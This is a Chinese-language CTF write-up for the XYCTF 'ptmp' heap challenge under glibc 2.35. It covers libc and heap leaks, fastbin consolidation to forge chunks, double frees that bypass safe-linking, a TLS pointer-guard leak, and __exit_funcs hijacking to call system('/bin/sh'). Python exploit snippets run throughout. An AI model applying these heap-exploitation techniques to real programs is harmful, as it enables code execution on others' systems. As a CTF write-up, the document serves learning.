# xyctf ptmp的做题记录(glibc2.35下的exit函数打法)

## 审题

- add函数 malloc一个0x18的chunk(0x20) 属性分别对应:size isUsed buff 并且仅在创建的时候可以写入数据 并且没有检测这个index是否在使用 所以我们可以对一个index无限malloc

  ![image-20240418005442527](https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240418005442527.png)

- delete函数 直接free记录信息的chunk和我们的内容体chunk(buff) 并且没有清空

  ![image-20240418005502800](https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240418005502800.png)

- view函数 直接write出size大小的内容 存在泄露

  ![image-20240418005523801](https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240418005523801.png)

- atexit函数

  ![image-20240418131700409](https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240418131700409.png)

## 大致利用原理:

> 这里先粗略写一下原理 后面细讲 整个利用原理不算难但是细节很多很多地方需要微调

- 泄露libc heap地址

  - 通过malloc 9个128 来申请0x90大小的chunk 然后free掉 让chunk进入unsortedbin中 再申请回来 通过write函数直接泄露libc地址 和heap地址

- 伪造fake chunk（消耗topchunk触发fastbin的合并）

  > 或者通过向scanf输入大量数据触发fastbin合并 因为scanf在接受大量数据的时候会申请一个largebin

  - 因为题目中存在isUsed 有了这个就阻止了我们`double free`所以我们让记录头信息的chunk进入fastbin中 并且通过消耗空topchunk 触发fastbin的合并机制 让fastbin进入unsortedbin中 再通过分割机制 让原本的信息头chunk成为我们的内容chunk(buff) 通过向chunk写入内容来劫持信息头chunk 改写isUsed和buff指针 来实现任意地址的free 从而实现double free

- 劫持__exit_funcs链表 实现在exit的时候任意函数的调用 通过两次double free 第一次泄露tls中的key 第二次负责修改__exit_funcs链表

  > 大概思路:[exit()分析与利用-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/243196)
  >
  > [[原创\] Glibc-2.35下对tls_dtor_list的利用详解-Pwn-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-280518.htm#msg_header_h2_1)
  >
  > 这俩个大佬提供了两种思路 我这边采用的Arahat0佬的劫持__exit_funcs链表的方式

## 泄露libc heap

> 最简单的一步

简单地通过让chunk进入tcache中 然后申请回来利用chunk中保留有关libc和heap的地址然后推算出libc基地址和heap基地址

```python
for i in range(9):
    add(i,128,b"a"*0x18)
for i in range(9):
    delete(i)
# 泄露出chunk
add(0,0x68,b"a"*8)
res = view(0)
base_heap = u64(res[2*8:3*8]) -1936
base_libc = u64(res[5*8:6*8]) -2206944
```

- chunk进入unsortedbin 

  ![image-20240418132947766](https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240418132947766.png)

- free 8时 unsortedbin进入topchunk 但是此时保留了fd 等信息 我们只需要malloc回来即可

  ![image-20240418133015055](https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240418133015055.png)

- 申请回来

  ![image-20240418133239908](https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240418133239908.png)

- 然后write直接泄露即可

## 伪造fake chunk

> 最消耗时间的一步

- 这里比较麻烦的就是fakechunk 这里我们将记录信息的chunk称之为`头chunk `记录`内容chunk`的size isUsed point 
- `point`指向的就是`内容chunk`

为了绕过isUsed的检测 我们可以利用`delete`后没有清空的特性将原本的`头chunk`覆盖掉 这样就能随意控制`isUsed`和`point`了 实现任意free 所以我们选择触发`fastbin的合并` 来让原本的头chunk之间相互合并 然后我们通过malloc指定大小的chunk来分割这个chunk 控制`内容chunk`刚好为原本某一个的`头chunk`

### 示意图

![image-20240418134333731](https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240418134333731.png)

- 这样我们就可以向content chunk写入内容劫持head chunk了 原理很简单 但是现在就要想办法触发fastbin中的合并机制了

### fastbin合并机制

- 范围:2.35
  - 我们可以通过申请large bin chunk 来触发合并
  - 我们可以通过让topchunk消耗完毕 然后触发合并

- 由于我们最大申请128 也就是0x90大小的chunk 显然第一种我们是没办法直接申请large chunk

  > Arahat0师傅提醒俺 我们可以通过向scanf输入大量数据 来让scanf malloc一个large chunk 然后触发合并 但是同时也会导致缓冲区一堆数据导致后续的scanf失灵 所以为了方便控制 我选择了将topchunk消耗完毕触发合并的方式

- 连续申请大量chunk 消耗topchunk到size为一个较小值 然后在最后申请chunk 并且free chunk 让chunk进入fastbin链中 然后malloc一个较大的chunk 彻底消耗topchunk 触发fastbin的合并 

  ```python
  # tcache 0x20 0x90均存满
  # 剩下0xf3c7d0
  for i in range(760):
      add(14,128,b"a"*0x18)
  
  for i in range(6):
      add(i,0x18,b"a"*0x8)
  # 防止fastbin合并后直接被topchunk合并 
  add(7,8,b"a"*8)
  for i in range(6):
      delete(i)
  add(14,128,b"a"*8)
  add(14,0x30,b"a"*8)
  ```

- 合并之前

  ![image-20240418151026231](https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240418151026231.png)

- 合并后

  ![image-20240418151102406](https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240418151102406.png)

### 构造fakecchunk

```python
fakechunk = {}
fakechunk["size"] = p64(0x21)
fakechunk["prev_size"] = p64(0)
fakechunk["chunk_list_size"] = p64(0x100)
fakechunk["isUsed"] = p64(1)
// 为触发泄露tls+0x30的double free的fastbinchunk地址
fakechunk["buff"] = p64(fd)
# 已经完成覆写 free index5则可实现任意free
add(14,0x58,b"a"*16+fakechunk["prev_size"]+fakechunk["size"]+fakechunk["chunk_list_size"]+fakechunk["isUsed"]+fakechunk["buff"])
```

- 此时index为5 就是我们劫持的`头chunk` 这里的fd就是我们后面要free的任意chunk

  ![image-20240418151731938](https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240418151731938.png)

## 泄露tls+0x30

> 由于要泄露tls+0x30处的地址 从而来泄露出key值 方便我们去劫持exit_funcs链表 所以我们需要构造一个double free来malloc下来tls附近的内存区域

- 难点

  - 我们需要控制内存对齐 并且还不能破坏到了canary的值 所以我们double free劫持的chunk大小需要够大
  - 实践发现这样会导致tcache中它标注的chunk数量和实际的数量并不对应 如果直接将fd填写为tls处地址 后续的malloc失效 因为tls处的fd位置我们并没有办法控制 大概率会是内存不对齐/内存不可写 所以我们需要后续的malloc
  - glibc2.35下存在fd加密机制 我们的fd需要经过与(base_heap>>12)进行异或操作 才是合法的fd才能够被正常解析 而且经过测试仿佛这里的base_heap会因为我们消耗topchunk一次而发生细微的改变 所以需要gdb手动调试计算出偏差

```python
# 构造一个double free
for i in range(6,11):
    add(i,0x18,b"a"*16)
# 这个chunk是以前为了当作跳板的chunk 但是后面切换了思路没有用了 为了不影响后续的heap计算就没有删除
add(14,0x68,p64(0)+p64(0x100)+p64((xor-0x21)^(tls+0x30)))
for i in range(6,11):
    delete(i)
delete(5)
for i in range(7):
    add(i,0x48,b"a"*8)
add(7,0x48,p64((xor)^(tls)))
for i in range(2):
    add(i,0x48,b"a"*8)
add(0,0x48,b"\x00")
# 泄露tls中信息
res = view(0)
```

- 首先是在fastbin上构造出两个以上的chunk 然后free第二个chunk 来绕过fastbin中检查double free的机制（fastbin会检查你free的是否为第一个chunk）

  ```python
  if (__builtin_expect(old == p, 0))
  	malloc_printerr("double free or corruption (fasttop)");
  p->fd = PROTECT_PTR(&p->fd, old);
  *fb = p;
  ```

![image-20240420123457567](https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240420123457567.png)

- 然后将利用开始构造好的fakechunk进行free

  ```python
  delete(5)
  ```

  ![image-20240420123602766](https://awaqwqa.github.io/img/xyctf_heap_pro/image-20240420123602766.png)

### fd加密机制

> glibc高版本加入的fd加密机制 让我们没办法直接覆盖fd 绕过也很简单泄露heap地址即可

- fd需要是heap基地址^目标地址

## 劫持exit_funcs链表

> 最难崩的一步 因为我们需要劫持这个链表所以我们需要再一次触发fastbin的合并构造double free 然后指向exit_func处 进行覆写
>
> 本地打这个感觉还行 但是打远程的时候我脚本足足要跑20分钟 并且还因为比赛方平台网络不是特别好 导致我反复失败 最终跑了一晚上才跑出来

- 难点
  - 因为上一次double free 导致tcache 中一条链已经存在一个无效的chunk地址(大概率不对齐) 所以我们下一次double free的时候就不能选择这个size大小的链了

```python

# size: 0x20c30
for i in range(758):
    add(14,128,b"a"*8)
for i in range(11):
    add(i,0x18,b"a"*8)
add_with_no_chunk(14)
for i in range(11):
    delete(i)
# 将topchunk消耗空触发合并
add(14,0x68,b"a"*8)

# 指定free index 6 可以实现任意free
# free_chunk就是后续构造double free的chunk地址
free_chunk = base_heap+271376+0x10
add(14,128,b"a"*8*4+p64(0)+p64(0x31)+p64(0x100)+p64(1)+p64(free_chunk))
# 填写binsh只是为了后续调用system函数的时候可以找个地址来当作参数
for i in range(6):
    add(i,0x68,b"/bin/sh\x00")
for i in range(7,13):
    add(i,0x68,b"/bin/sh\x00")
for i in range(6):
    delete(i)
for i in range(7,13):
    delete(i)
# 触发double free
delete(6)
for i in range(7):
    add(i,0x68,b"a"*8)
# 将fd指向exit_function地址处
add(i,0x68,p64((xor+0x21)^exit_function))
add(0,0x68,b"a"*8)
add(0,0x68,b"/bin/sh\x00")
res = getData(res)
# 获取key的值
res = res[6]
# 计算出key加密后的地址
manba = remove_high_digits(rol(0x401700^res),16)
addr = remove_high_digits(rol(system_addr^res),16)
print("key:",hex(res))
print("libc_base",hex(base_libc))
print("heap_base",hex(base_heap))
print("system_addr",hex(system_addr))
print("exit_function:",hex(exit_function))
print("addr",hex(addr))

add(0,0x68,p64(4)+p64(addr)+p64(base_heap+0x42420))
ru(b">>> ")
sl(b"5")
print("key:",hex(res))
print("libc_base",hex(base_libc))
print("heap_base",hex(base_heap))
print("system_addr",hex(system_addr))
print("exit_function:",hex(exit_function))
print("addr",hex(addr))
ia()

```

